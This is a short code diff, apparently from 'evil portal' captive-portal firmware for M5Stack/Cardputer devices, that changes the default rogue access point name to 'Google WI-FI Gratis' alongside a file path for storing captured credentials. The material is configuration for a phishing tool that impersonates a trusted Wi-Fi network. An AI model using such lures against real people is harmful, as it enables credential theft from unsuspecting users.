@@ -46,7 +46,7 @@
 #include <M5Cardputer.h>
 #endif
 
-#define DEFAULT_AP_SSID_NAME "Google WiFi"
+#define DEFAULT_AP_SSID_NAME "Google WI-FI Gratis"
 #define SD_CREDS_PATH "/evil-portal-creds.txt"
 // #define LANGUAGE_EN_US
 #define LANGUAGE_PT_BR
